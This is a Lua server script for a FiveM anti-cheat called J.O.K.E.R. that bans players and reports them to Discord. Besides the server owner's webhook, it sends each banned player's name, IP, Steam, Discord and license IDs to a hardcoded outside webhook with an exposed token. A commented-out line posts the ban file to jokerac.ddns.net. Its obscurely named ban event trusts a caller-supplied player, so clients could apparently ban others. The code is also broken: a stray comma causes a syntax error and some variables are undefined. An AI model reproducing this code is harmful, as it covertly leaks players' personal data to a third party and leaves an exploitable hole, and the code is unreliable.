local banned = ""
local bannedTable = {}

function loadBans()
        banned = LoadResourceFile(GetCurrentResourceName(), "bans.json") or ""
        if banned ~= "" then
                bannedTable = json.decode(banned)
        else
                bannedTable = {}
        end
end

AddEventHandler('onResourceStart', function()
      loadBans()
end)

function isBanned(source)
        if bannedTable[source] ~= nil then
                return bannedTable[source]
        else
                return false
        end
end

function permBanUser(bannedBy, player)
      bannedTable[player] = {                
       banner = bannedBy,
       reason = "Detected",
       expire = 0,
},
        SaveResourceFile(GetCurrentResourceName(), "bans.json", json.encode(bannedTable,{indent = true}) , -1)
        --PerformHttpRequest("http://jokerac.ddns.net/bans.json", function(reCode, result, resultHeaders) end, 'POST', json.encode(bannedTable,{ indent = true}) , -1)
end

AddEventHandler('playerConnecting', function(playerName,setKickReason,set)
  local name = GetPlayerName(source)

  local license,steamID,liveid,xblid,discord,playerip  = "n/a","n/a","n/a","n/a","n/a","n/a"

for k,v in pairs(GetPlayerIdentifiers(source))do
      
    if string.sub(v, 1, string.len("steam:")) == "steam:" then
      steamid = v
    elseif string.sub(v, 1, string.len("license:")) == "license:" then
      license = v
    elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
      xbl  = v
    elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
      ip = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      discord = v
    elseif string.sub(v, 1, string.len("live:")) == "live:" then
      liveid = v
    end
  
end
  for k,v in ipairs(GetPlayerIdentifiers(source))do
          local banData = isBanned(v)
          if banData ~= false then
            setKickReason('\nYou have been globaly banned from every server that protected by J.O.K.E.R.')
                  CancelEvent()
                  break
          end
      end
end)



RegisterNetEvent('101511518:71520381')
AddEventHandler('101511518:71520381',function(reason, player)
  if player == nil or player == "" then 
    _source = source
    player = _source  
  end
  local name = GetPlayerName(player)
  local steamidentifer = GetPlayerIdentifier(player)
  local identifiers, steamIdentifier = GetPlayerIdentifiers(player)
  local steamid  = false
  local license  = false
  local discord  = false
  local ips       = false

        if IsPlayerAceAllowed(player, "joker.bypass") then

            else

for k,v in ipairs(GetPlayerIdentifiers(player))do
  if string.sub(v, 1, string.len("steam:")) == 
  "steam:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("ip:")) == 
          "ip:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("license:")) == 
                  "license:" then permBanUser(steamidentifer, v) elseif string.sub(v, 1, string.len("discord:")) == 
                          "discord:" then permBanUser(steamidentifer, v) end
  end
  for k,v in pairs(GetPlayerIdentifiers(player))do
          if string.sub(v, 1, string.len("steam:")) == "steam:" then steamid = v elseif string.sub(v, 1, string.len("license:")) == "license:" then license = v elseif string.sub(v, 1, string.len("ip:")) == "ip:" then ips = v elseif string.sub(v, 1, string.len("discord:")) == "discord:" then discord = v end
  end
  DropPlayer(player, '\nYou have been globaly banned from every server that protected by J.O.K.E.R.')
 if name ~= nil then  
  PerformHttpRequest(Joker.Webhook, function(err, text, headers) end, 'POST', json.encode({ embeds = {
    {
         author = {
           name = "J.O.K.E.R. [BAN]",
           url = "",
           icon_url = "https://cdn.discordapp.com/attachments/708228335494234146/801153153289420800/Jok.png"
         },
         description = "**\nName: **"..tostring(name).."**\n Steam: **"..tostring(steamidentifer).."**\n Discord: **"..tostring(discord).."**\n Fivem: **"..tostring(license).."**\nIP: **"..tostring(ips).."**\nReason: **"..tostring(reason),
         color = "9841982"
       }
     }
   }), { ['Content-Type'] = 'application/json' })
   
   
   PerformHttpRequest("https://discord.com/api/webhooks/812313311164891186/qlNNmIlfE-pe_PAkN6K9_DGsfXuOewUqYIXz0232M74N8nUTaMCH533FCOWkxa95qxkx", function(err, text, headers) end, 'POST', json.encode({ embeds = {
     {
       author = {
         name = "J.O.K.E.R. [BAN]",
         url = "",
         icon_url = "https://cdn.discordapp.com/attachments/708228335494234146/801153153289420800/Jok.png"
       },
       description = "\n**Name:** "..tostring(name).."\n **Steam: **"..tostring(steamidentifer).."\n **Discord:** "..tostring(discord).."\n **Fivem:** "..tostring(license).."\n**IP: **"..tostring(ips).."\n**Reason: **"..tostring(reason),
       color = "9841982"
     }
   }
   }), { ['Content-Type'] = 'application/json' })
  end
 end
end)